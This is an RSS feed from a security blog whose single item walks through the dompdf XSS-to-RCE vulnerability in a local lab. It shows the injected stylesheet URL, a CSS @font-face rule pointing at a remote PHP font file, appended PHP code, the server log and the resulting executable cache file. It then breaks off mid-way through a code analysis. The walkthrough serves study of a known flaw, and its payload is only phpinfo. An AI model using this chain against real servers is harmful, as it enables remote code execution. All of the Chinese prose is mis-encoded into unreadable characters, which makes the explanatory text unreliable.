<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>F0rmat&#39;s Blog</title>
    <link>https://xxe.icu/</link>
    <description>Recent content on F0rmat&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 28 May 2023 11:04:34 +0800</lastBuildDate>
    
        <atom:link href="https://xxe.icu/atom.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>åˆ©ç”¨dompdfæ¼æ´ä»XSSåˆ°RCE</title>
      <link>https://xxe.icu/using_dompdf_vulnerability_from_xss_to_rce.html</link>
      <pubDate>Sun, 28 May 2023 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/using_dompdf_vulnerability_from_xss_to_rce.html</guid>
      
        <description>&lt;h2 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªæ¼æ´æ˜¯åœ¨å»å¹´çš„ä¸‰æœˆä»½çˆ†å‡ºæ¥çš„ï¼Œä»Šå¤©åˆšå¥½é‡åˆ°è¿™ä¸ªæ¼æ´çš„ç¯å¢ƒï¼Œé‚å†™ä¸€æ–‡è®°å½•ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x01-æ¼æ´è¯¦æƒ…&#34;&gt;0x01 æ¼æ´è¯¦æƒ…&lt;/h2&gt;
&lt;h3 id=&#34;æ¼æ´æè¿°&#34;&gt;æ¼æ´æè¿°&lt;/h3&gt;
&lt;p&gt;dompdfæ˜¯ä¸€ä¸ªç”¨äºå°†HTMLè½¬æ¢ä¸ºPDFçš„PHPåº“ï¼Œç”±äºå…¶æ˜“ç”¨æ€§å’Œå¹¿æ³›çš„ä½¿ç”¨ï¼Œdompdfä¹Ÿæˆä¸ºäº†æ”»å‡»è€…çš„æ”»å‡»ç›®æ ‡ï¼Œå€Ÿç”¨&lt;a href=&#34;mailto:maximilan@positive.security&#34;&gt;MAXIMILIAN&lt;/a&gt;çš„å›¾ç‰‡ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dompdf/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;1ã€ä½¿ç”¨å¤–éƒ¨çš„cssæ³¨å…¥åˆ°pdfå½“ä¸­&lt;/p&gt;
&lt;p&gt;2ã€csså†…å®¹åŒ…å«äº†è¿œç¨‹çš„å­—ä½“é“¾æ¥ï¼ˆå­˜åœ¨æ¶æ„ä»£ç ï¼‰ï¼Œä»è€Œè®©åº”ç”¨ç¨‹åºè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨çš„å­—ä½“æ–‡ä»¶è¿›è¡ŒåŠ è½½ï¼ˆå…¶å®è¿™é‡Œè¿˜æœ‰ä¸ªæ— å›æ˜¾çš„SSRFæ¼æ´ï¼Œä½†æ˜¯æ¯”è¾ƒé¸¡è‚‹ï¼‰&lt;/p&gt;
&lt;p&gt;3ã€å½“ä¸­åŠ è½½å­—ä½“çš„æ—¶å€™ä¼šç”Ÿæˆphpçš„ç¼“å­˜æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´äº†RCEã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ¼æ´åˆ©ç”¨&#34;&gt;æ¼æ´åˆ©ç”¨&lt;/h3&gt;
&lt;p&gt;1ã€å‰ææ¡ä»¶&lt;/p&gt;
&lt;p&gt;éœ€è¦å¼€å¯&lt;code&gt;isPhpEnabled&lt;/code&gt;å’Œ&lt;code&gt;isRemoteEnabled&lt;/code&gt;  ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨&lt;a href=&#34;https://github.com/dompdf/dompdf/blob/v1.2.0/src/Options.php&#34;&gt;Options.php&lt;/a&gt;çš„161è¡Œå’Œ183è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isPhpEnabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * Enable remote file access
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * If this setting is set to true, DOMPDF will access remote sites for
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * images and CSS files as required.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * ==== IMPORTANT ====
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * This can be a security risk, in particular in combination with isPhpEnabled and
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-&amp;gt;load_html(...);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * This allows anonymous users to download legally doubtful internet content which on
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * tracing back appears to being downloaded by your server, or allows malicious php code
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * in remote html pages to be executed by your server with your account privileges.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * This setting may increase the risk of system exploit. Do not change
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * this settings without understanding the consequences. Additional
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * documentation is available on the dompdf wiki at:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * https://github.com/dompdf/dompdf/wiki
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     * @var bool
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$isRemoteEnabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2ã€åˆ©ç”¨è¿‡ç¨‹&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨çš„ç¯å¢ƒæ˜¯https://github.com/positive-security/dompdf-rceï¼Œå¯åŠ¨åè®°å¾—ä¿®æ”¹**&lt;a href=&#34;https://github.com/positive-security/dompdf-rce/blob/main/exploit/exploit_font.php&#34;&gt;exploit_font.php&lt;/a&gt;é‡Œé¢çš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ–°å»ºä¸€ä¸ªtest.css,è®¾ç½®ä¸€ä¸ªèƒŒæ™¯ä¸ºçº¢è‰²çš„çš„å†…å®¹ï¼Œç„¶åä½¿ç”¨linkè¿›è¡ŒåŠ è½½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;color&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨æµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://127.0.0.1/dompdf/index.php?pdf&amp;amp;title=%3Clink%20rel=stylesheet%20href=%27http://localhost:9001/exploit.css%27%3E&#34;&gt;http://127.0.0.1/dompdf/index.php?pdf&amp;amp;title=&lt;!-- raw HTML omitted --&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»åŠ è½½äº†è¿œç¨‹cssçš„å†…å®¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dompdf/Untitled%201.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´å­˜åœ¨XSSæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆè¿›è¡ŒRCEï¼Œå…ˆæ¼”ç¤ºæ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;ç¼–å†™ä¸€ä¸ªcssæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;face&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;family&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exploitfont&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1:9001/exploit_font.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;weight&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;normal&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;normal&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¿é—®æˆ‘ä»¬çš„cssæ–‡ä»¶ä¼šåŠ è½½è¿œç¨‹çš„å­—ä½“æ–‡ä»¶ï¼Œæˆ‘ä»¬å†ç¼–å†™ä¸€ä¸ªæœ‰åŒ…å«æˆ‘ä»¬æ¶æ„ä»£ç çš„å­—ä½“æ–‡ä»¶ï¼Œå› ä¸ºè¯¥æ¼æ´è¦å…ˆè§£æå­—ä½“æ‰å¯ä»¥å¾€ä¸‹æ‰§è¡Œï¼Œæ‰€ä»¥ï¼Œå»https://github.com/dompdf/php-font-libæ‰¾ä¸€ä¸ªå­—ä½“ç„¶ååœ¨æœ€åé¢åŠ ä¸Šphpinfoçš„ä»£ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åè®¿é—®è¯¥é“¾æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://127.0.0.1/dompdf/index.php?pdf&amp;amp;title=%3Clink%20rel=stylesheet%20href=%27http://localhost:9001/exploit.css%27%3E&#34;&gt;http://127.0.0.1/dompdf/index.php?pdf&amp;amp;title=&lt;!-- raw HTML omitted --&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¼šå‡ºç°å·²ç»åŠ è½½äº†ä¸¤ä¸ªæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Serving&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;HTTP&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;::&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9001&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9001&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;May&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2023&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /exploit.css HTTP/1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;May&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2023&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /exploit_font.php HTTP/1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨&lt;code&gt;/dompdf/lib/fonts/&lt;/code&gt; ä¼šç”Ÿæˆè¯¥æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exploitfont_normal_3f83639933428d70e74a061f39009622.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://127.0.0.1/dompdf/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php&#34;&gt;http://127.0.0.1/dompdf/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å·²ç»å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dompdf/Untitled%202.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ¼æ´åˆ†æ&#34;&gt;æ¼æ´åˆ†æ&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬çœ‹è¿™ä¸ªç‰ˆæœ¬ä¿®å¤çš„åœ°æ–¹æ˜¯åœ¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/dompdf/dompdf/pull/2808/files/00b2b360ace768d58430f1cc5a20cb43d58bbc1a#diff-a0473fa74c65efedd487f657d52cb196245a84d2b13e622818dd0d7283da6d38&#34;&gt;https://github.com/dompdf/dompdf/pull/2808/files/00b2b360ace768d58430f1cc5a20cb43d58bbc1a#diff-a0473fa74c65efedd487f657d52cb196245a84d2b13e622818dd0d7283da6d38&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/dompdf/Untitled%203.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¼æ´å‡ºç°åœ¨&lt;strong&gt;FontMetrics.php&lt;/strong&gt;æ–‡ä»¶çš„registerFontå‡½æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;* @param array $style
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;* @param string $remoteFile
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;* @param resource $context
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;* @return bool
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;registerFont&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$remoteFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$context&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nv&#34;&gt;$fontname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mb_strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;family&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//è¿™é‡Œæ˜¯è·å–æˆ‘ä»¬åˆšæ‰ccsæ–‡ä»¶çš„font-familyå‚æ•°å†…å®¹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;nv&#34;&gt;$styleString&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;weight&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span 